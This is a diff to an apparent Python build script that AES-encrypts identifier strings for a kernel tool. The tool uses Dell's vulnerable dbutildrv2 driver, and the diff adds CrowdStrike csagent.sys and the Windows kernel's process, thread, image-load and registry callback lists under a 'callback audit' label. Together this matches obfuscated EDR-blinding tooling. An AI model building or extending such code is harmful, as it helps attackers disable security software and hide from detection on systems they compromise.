@@ -78,12 +78,25 @@ strings = {
     "BLOB_INF":     "dbutildrv2.inf",
     "BLOB_PSI":     "PsInitialSystemProcess",
     "BLOB_ROOT":    "ROOT\\DBUtilDrv2",
+    # kernel callback audit (-K): target module + the non-exported kernel
+    # globals that enumerate its registered notification callbacks
+    "BLOB_CSA":     "csagent.sys",
+    "BLOB_CSD":     "CrowdStrike",
+    "BLOB_PPN2":    "PspCreateProcessNotifyRoutine",
+    "BLOB_PTN2":    "PspCreateThreadNotifyRoutine",
+    "BLOB_PPN":     "PspProcessNotifyRoutine",
+    "BLOB_PTN":     "PspThreadNotifyRoutine",
+    "BLOB_LIN":     "PspLoadImageNotifyRoutine",
+    "BLOB_CMH":     "CmCallbackListHead",
+    "BLOB_CBH2":    "CallbackListHead",
+    "BLOB_CBH3":    "CmCallBackListHead",
+    "BLOB_CBCT":    "CmpCallBackCount",
 }
 cipher = AES.new(bytes(real_key), AES.MODE_ECB)
 blobs = {}
 for n, s in strings.items():
     b = s.encode()
-    b += b"\x00" * ((16 - len(b) % 16) % 16)
+    b += b"\x00" * (16 - len(b) % 16)  # always >=1 NUL terminator
     blobs[n] = cipher.encrypt(b)
 
 # sanity: pycryptodome decrypt round trip
